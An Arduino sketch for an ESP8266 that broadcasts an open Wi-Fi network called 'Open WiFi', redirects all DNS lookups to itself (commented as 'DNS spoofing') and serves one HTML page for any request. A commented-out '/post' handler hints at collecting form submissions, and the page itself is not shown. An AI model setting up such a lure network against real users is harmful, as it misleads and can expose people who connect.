

#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>

#include <Html.h>

#define SSID_NAME "Open WiFi"

IPAddress APIP(172, 0, 0, 1);

DNSServer dnsServer;

ESP8266WebServer webServer(80);

void setup()
{
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(SSID_NAME);

  dnsServer.start(53, "*", APIP); // DNS spoofing (Only HTTP)
  // webServer.on("/post",[]() { webServer.send(HTTP_CODE, "text/html", posted()); BLINK(); });
  webServer.onNotFound([]()
                       { webServer.send(200, "text/html", html()); });
  webServer.begin();
  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, HIGH);
}

void loop()
{
  Serial.println("Server running...");
  dnsServer.processNextRequest();
  webServer.handleClient();
}
